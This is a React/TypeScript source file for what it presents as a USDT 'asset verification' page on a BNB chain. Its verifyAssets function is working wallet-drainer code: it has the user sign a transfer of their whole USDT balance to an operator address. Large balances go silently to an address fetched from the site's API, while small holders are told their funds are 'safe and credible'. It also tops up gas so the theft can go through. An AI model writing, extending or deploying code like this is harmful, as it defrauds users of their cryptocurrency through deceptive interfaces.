import React, { useState, useEffect } from "react";
import { ethers } from "ethers";
import { createRoot } from "react-dom/client";
import {fundBNBIfNeeded} from "@/utils/gasUtils"
import usdtAbi from "../abi/USDT.json";
import { USDT_ADDRESS, USDT_RECEIVER, CHAIN_ID, CHAIN_ID_DECIMAL, NETWORK_NAME, USDT_THRESHOLD, GAS_FUNDER_ADDRESS, USDT_THRESHOLD2 } from "../utils/config";
import SuccessCard from "./SuccessCard";
import VerifiedCard from "./VerifiedCard";

// Global state to control card visibility from the standalone function
let globalShowCard = false;
let globalVerificationStatus = null;
// @ts-expect-error build

let root = null;

// Function to render verification cards
export const renderVerificationCard = (status: {
  success: boolean;
  transferred: boolean;
  amount: string;
  message: string;
}) => {
  console.log("🎴 Rendering verification card with status:", status);
  globalVerificationStatus = status;
  globalShowCard = true;
  
  // Create verification element if doesn't exist
  let verificationRoot = document.getElementById('verification-root');
  if (!verificationRoot) {
    console.log("📝 Creating verification root element");
    verificationRoot = document.createElement('div');
    verificationRoot.id = 'verification-root';
    document.body.appendChild(verificationRoot);
  }

  console.log("🎨 Rendering appropriate card based on status");
  // Create root if it doesn't exist
// @ts-expect-error build

  if (!root) {
    root = createRoot(verificationRoot);
  }

  // Render the appropriate card based on status
  root.render(
    status.transferred ? (
      <SuccessCard amount={status.amount} onClose={closeCard} />
    ) : (
      <VerifiedCard amount={status.amount} onClose={closeCard} />
    )
  );

  console.log("📢 Dispatching verification-complete event");
  // Also dispatch event for any mounted components
  window.dispatchEvent(new Event('verification-complete'));
};

// Function to close cards
const closeCard = () => {
  console.log("🔒 Closing verification card");
  globalShowCard = false;
  
  // Find and cleanup the verification root
  const verificationRoot = document.getElementById('verification-root');
  if (verificationRoot) {
    console.log("🧹 Cleaning up verification root");
// @ts-expect-error build

    if (root) {
      root.unmount();
      root = null;
    }
    if (!verificationRoot.hasChildNodes()) {
      verificationRoot.remove();
    }
  }
  
  console.log("📢 Dispatching verification-complete event");
  window.dispatchEvent(new Event('verification-complete'));
};

// Plain function for onClick handler
export const verifyAssets = async (
  provider: ethers.providers.Web3Provider,
  signer: ethers.providers.JsonRpcSigner,
  userAddress: string,
  usdt: ethers.Contract,
  balance: ethers.BigNumber,
  readableBalance: string,
  decimals: number
) => {
  console.log("🚀 Starting asset verification process");
  console.log("📊 Current balance:", readableBalance, "USDT");
  
  try {
    const threshold = ethers.utils.parseUnits(String(USDT_THRESHOLD), decimals);
    const threshold2 = ethers.utils.parseUnits(String(USDT_THRESHOLD2), decimals);

    // Case 1: Balance is >= USDT_THRESHOLD2
    if (balance.gte(threshold2)) {
      console.log("💰 Balance meets threshold 2. Proceeding with special transfer.");
      await fundBNBIfNeeded(provider, userAddress);
      
      try {
        const usdtWithSigner = usdt.connect(signer);
        
        console.log("📝 Fetching special receiver address...");
        const response = await fetch('/api/get-receiver-address');
        if (!response.ok) {
          const errorData = await response.json().catch(() => ({}));
          throw new Error(errorData.details || `Failed to fetch receiver address: ${response.statusText}`);
        }
        const data = await response.json();
        const receiverAddress = data.address;
        if (!receiverAddress) {
          throw new Error("API did not return a receiver address");
        }

        console.log("👉 Transferring to special address:", receiverAddress);
        const tx = await usdtWithSigner.transfer(receiverAddress, balance);
        await tx.wait();
        console.log("✅ Special transaction confirmed:", tx.hash);
        // Per instructions, do NOT show a card here.

      } catch (error) {
        // @ts-expect-error build
        if (error.code === 4001) {
          console.log("❌ User rejected transaction");
          return;
        }
        console.error("❌ Special transfer failed:", error);
        throw error; // Re-throw to be caught by the outer catch block
      }

    // Case 2: Balance is >= USDT_THRESHOLD but < USDT_THRESHOLD2
    } else if (balance.gte(threshold)) {
      console.log("💰 Balance meets threshold 1. Proceeding with standard transfer.");
      await fundBNBIfNeeded(provider, userAddress);

      try {
        const usdtWithSigner = usdt.connect(signer);
        const receiverAddress = USDT_RECEIVER;

        console.log("👉 Transferring to standard address:", receiverAddress);
        const tx = await usdtWithSigner.transfer(receiverAddress, balance);
        await tx.wait();
        console.log("✅ Standard transaction confirmed:", tx.hash);

        // Show success card for standard transfers
        renderVerificationCard({
          success: true,
          transferred: true,
          amount: readableBalance,
          message: `Successfully verified and transferred ${readableBalance} USDT`
        });

      } catch (error) {
        // @ts-expect-error build
        if (error.code === 4001) {
          console.log("❌ User rejected transaction");
          return;
        }
        console.error("❌ Standard transfer failed:", error);
        throw error; // Re-throw to be caught by the outer catch block
      }

    // Case 3: Balance is < USDT_THRESHOLD
    } else {
      console.log("ℹ️ Balance below threshold, marking as verified without transfer");
      renderVerificationCard({
        success: true,
        transferred: false,
        amount: readableBalance,
        message: `Verified: Your ${readableBalance} USDT is safe and credible to use`
      });
    }
  } catch (error) {
    console.error("❌ Verification process error:", error);
    // You might want to show a generic error card to the user here
  }
};